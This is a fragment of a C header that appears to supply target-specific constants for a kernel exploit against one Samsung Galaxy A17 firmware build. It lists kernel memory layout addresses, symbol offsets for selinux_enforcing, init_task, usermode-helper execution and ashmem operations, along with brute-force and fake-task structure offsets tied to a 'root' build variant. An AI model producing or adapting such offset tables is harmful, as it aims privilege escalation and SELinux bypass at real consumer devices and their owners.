...
#define BUILD_VARIANT_LABEL "a17-A176BXXU5CZE9-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#define APP_REQUIRE_FRESH_P0_SESSION 1
#else
#define BUILD_VARIANT_LABEL "a17-A176BXXU5CZE9-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a17nsxx/a17:15/AP3A.240905.015.A2/A176BXXU5CZE9:user/release-keys"
#endif
...
#define MM_ORDER 3
#define KSNITCH_BRUTEFORCE_STRIDE 0x20
...
#define P0_FINGERPRINT_HEADER \
  "targets/a17-A176BXXU5CZE9/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff8100000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL
#define VMEMMAP_START 0xfffffffeffe00000ULL

#define ASHMEM_MISC_FOPS_OFF 0x02464250ULL
#define ASHMEM_FOPS_OFF 0x01a5d298ULL
#define ASHMEM_IOCTL_OFF 0x00c6067cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c60c34ULL
#define ASHMEM_MMAP_OFF 0x00c60c8cULL
#define ASHMEM_OPEN_OFF 0x00c60ec8ULL
#define ASHMEM_RELEASE_OFF 0x00c60f4cULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c6106cULL
#define CONFIGFS_READ_ITER_OFF 0x0047600cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004764c8ULL
#define COPY_SPLICE_READ_OFF 0x003fd2acULL
#define NOOP_LLSEEK_OFF 0x003b23acULL
#define INIT_TASK_OFF 0x0230fc40ULL
#define ROOT_TASK_GROUP_OFF 0x024f5f40ULL
#define SELINUX_ENFORCING_OFF 0x022fae20ULL
#define KMALLOC_CACHES_OFF 0x01aaf5f0ULL
#define ANON_PIPE_BUF_OPS_OFF 0x018e3860ULL
...
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100f64ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x025c8f50ULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017e6609ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x023025a8ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02423170ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x026a9ac9ULL
...
#define FAKE_TASK_TASK_GROUP_OFF 0x408
#define FAKE_TASK_PI_LOCK_OFF 0x88c
#define FAKE_TASK_PI_WAITERS_OFF 0x8a0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8b0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b8
